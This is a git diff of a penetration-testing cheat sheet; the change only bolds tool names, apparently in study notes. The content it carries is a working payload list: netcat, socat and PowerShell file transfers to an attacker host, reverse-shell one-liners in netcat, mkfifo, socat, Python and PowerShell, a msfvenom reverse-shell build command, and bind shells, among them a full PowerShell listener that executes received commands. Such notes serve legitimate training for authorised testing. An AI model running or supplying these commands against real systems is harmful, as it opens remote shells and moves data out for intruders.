@@ -1,22 +1,22 @@
 ## File Transfers
-- netcat
+- **netcat**
 	- send wget.exe to a nc listener on port 4444:
 	`nc -nv {ip-address} 4444 < /usr/share/windows-resources/binaries/wget.exe`
 	- receive a file on port 4444 and name it wget.exe:
 	`nc -nlvp 4444 > wget.exe`
 
-- socat
+- **socat**
 	- Share a file called passwords.txt on port 443:
 	`sudo socat TCP4-LISTEN:443,fork file:passwords.txt`
 	- Receive a file being hosted on port 443 and save it to passwords.txt:
 	`socat TCP4:{ip-address}:443 file:passwords.txt,create`
 
-- powershell 
+- **powershell** 
 	- `Set-ExecutionPolicy Unrestricted` must be applied beforehand
 	- Download wget.exe from a websever (such as a SimpleHTTPServer) :
 	 `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{ip-address}/wget.exe','C:\Users\offsec\Desktop\wget.exe')" `
 
-- SMB
+- **SMB**
 	- set up a SMB server on Kali with a share called Tools in the wd
 	`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .`
 	- copy a file from Kali to Windows
@@ -27,29 +27,29 @@
 ## Reverse Shells
 Victim connnects and attacker listens. Used 95% of the time.
 
-- netcat
+- **netcat**
 	- attacker runs: `nc -nlvp 4444`
 	- victim runs: `nc -nv {ip-address} 4444 -e /bin/bash` 
 
-- socat (unencrypted)
+- **socat (unencrypted)**
 	- attacker runs: `sudo socat -d -d  TCP4-LISTEN:4444 STDOUT`
 	- victim runs (linux): `socat TCP4:{ip-address}:4444 EXEC:/bin/bash`
 	- victim runs (windows): `socat TCP4:{ip-address}:4444 EXEC:cmd.exe,pipes`
 
-- netcat without `-e` or `-c` on victim
+- **netcat without `-e` or `-c` on victim**
 	- attacker runs: `nc -nlvp 4444`
 	- victim runs: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip-address} 1234 >/tmp/f`
 
-- msfvenom to create reverse shell binaries
+- **msfvenom to create reverse shell binaries**
 	- windows: `msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip-address} LPORT={port} -f exe -o reverse.exe`
 	- linux: 
 	- attacker can set up a listener with netcat of metasploit's multi/handler
 
-- python
+- **python**
 	- attacker runs: `nc -nlvp 4444`
 	- victim runs: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("PUT-IP-HERE",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
-- powershell
+- **powershell**
 	- attacker runs: `nc -nlvp 443`
 	- victim runs on cmd prompt: 
 ```powershell
@@ -59,16 +59,16 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('IP-ADDRESS',44
 ## Bind Shells
 Victim listens and attacker connects. Useful when bypassing firewalls or when reverse shells "just don't work".
 
-- netcat
+- **netcat**
 	- victim runs: `nc -nlvp 4444 -e cmd.exe`
 	- attacker runs: `nc -nv 10.11.0.22 4444`
 
-- socat
+- **socat**
 	- victim runs (linux): `socat -d -d TCP4-LISTEN:4444 EXEC:/bin/bash`
 	- victim runs (windows): `socat -d -d TCP4-LISTEN:443 EXEC:cmd.exe,pipes`
 	- attacker runs: `socat - TCP4:{ip-address}:4444`
 
-- powershell
+- **powershell**
 	- victim runs: 
 ```powershell
 powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
